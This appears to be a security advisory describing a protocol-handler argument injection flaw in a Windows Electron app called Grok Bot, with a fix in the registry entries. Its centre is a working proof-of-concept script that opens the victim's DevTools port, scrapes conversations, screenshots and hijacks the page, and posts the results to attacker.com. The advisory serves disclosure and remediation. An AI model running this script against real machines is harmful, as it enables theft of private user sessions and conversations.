CRITICAL — CVSS 9.3

Grok Bot — Protocol Handler Argument Injection

CVE-2018-1000006 class • Electron 42.11.16 • Windows • One-click session hijack

Vulnerability Summary

Grok Bot registers grokbot:// and sand:// custom protocol handlers on Windows without the -- end-of-options separator in the registry command. An attacker can inject arbitrary Chromium flags, including --remote-debugging-port, enabling full Chrome DevTools Protocol (CDP) access to the victim's authenticated session.

Registry (Vulnerable)

"C:\Program Files\Grok Bot\Grok Bot.exe" "%1"

Registry (Fixed)

"C:\Program Files\Grok Bot\Grok Bot.exe" "--" "%1"

PoC — CDP Exfiltration

After the victim clicks the malicious link and Grok Bot launches with CDP enabled, run the following from the attacker machine (requires network access to victim's port 47906):

// 1. Get CDP targets
fetch('http://VICTIM_IP:47906/json')
  .then(r => r.json())
  .then(targets => {
    const ws = new WebSocket(targets[0].webSocketDebuggerUrl);
    ws.onopen = () => {
      // 2. Extract all conversations
      ws.send(JSON.stringify({
        id: 1,
        method: 'Runtime.evaluate',
        params: {
          expression: `
            JSON.stringify(
              [...document.querySelectorAll('[role="article"]')]
                .map((el,i) => ({
                  index: i,
                  text: el.innerText.substring(0,2000)
                }))
            )`,
          returnByValue: true
        }
      }));

      // 3. Take screenshot
      ws.send(JSON.stringify({
        id: 2,
        method: 'Page.captureScreenshot',
        params: { format: 'png' }
      }));

      // 4. Hijack UI
      ws.send(JSON.stringify({
        id: 3,
        method: 'Page.navigate',
        params: { url: 'data:text/html,<h1>HIJACKED</h1>' }
      }));
    };

    ws.onmessage = (e) => {
      const msg = JSON.parse(e.data);
      // 5. Exfiltrate to attacker webhook
      fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(msg)
      });
    };
  });

  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"

HKCR\grokbot\shell\open\command
  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"

HKCU\Software\Classes\sand\shell\open\command
  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"

HKCR\sand\shell\open\command
  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"

Remediation

Add -- (end-of-options sentinel) before "%1" in all four registry entries:

"C:\Program Files\Grok Bot\Grok Bot.exe" "--" "%1"

This prevents Chromium from interpreting injected flags after the URL argument. This is the standard fix applied by VS Code, Discord, Slack, and other Electron apps after CVE-2018-1000006.
